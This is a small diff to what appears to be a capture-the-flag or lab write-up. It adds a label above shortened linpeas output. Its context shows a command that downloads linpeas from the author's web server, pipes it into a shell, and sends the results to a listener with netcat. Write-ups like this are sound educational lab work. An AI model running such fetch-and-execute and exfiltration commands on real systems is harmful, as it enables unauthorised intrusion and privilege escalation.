@@ -296,6 +296,7 @@ Once that's done, I download linpeas on the box from my machine web server and r
 curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999
 ```
 
+linpeas.out (shortened):
 ```
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
